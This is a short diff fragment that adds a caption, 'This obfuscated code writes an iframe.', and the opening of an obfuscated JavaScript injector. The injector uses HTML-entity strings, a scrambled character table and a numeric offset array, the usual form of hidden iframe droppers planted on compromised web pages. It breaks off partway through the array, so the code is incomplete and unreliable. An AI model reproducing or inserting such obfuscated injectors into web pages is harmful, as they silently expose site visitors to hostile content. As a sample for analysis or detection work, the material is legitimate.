@@ -1,0 +1,6 @@
+d(f);
+}
+
+This obfuscated code writes an iframe.
+
+<script>el=do​cument.createElement("div");el.innerHTML="&#82;&#101;&#102;&#101;&#114;&#101;&#110;&#99;&#101;&#69;&#114;&#114;";try{try{a1=a2}catch(a){b[2]=21};}catch(a){k=el.innerHTML+a.toString().substr(0,0);};var ar=",\"C0hgev)=z(liwysc/dp'}[No1rB.Tf]; A>b taEun{<:m";var ar2="R136,0,-84,72,28,-108,32,24,-32,100,20,-164,148,-16,-40,-96,4,132,8,-1
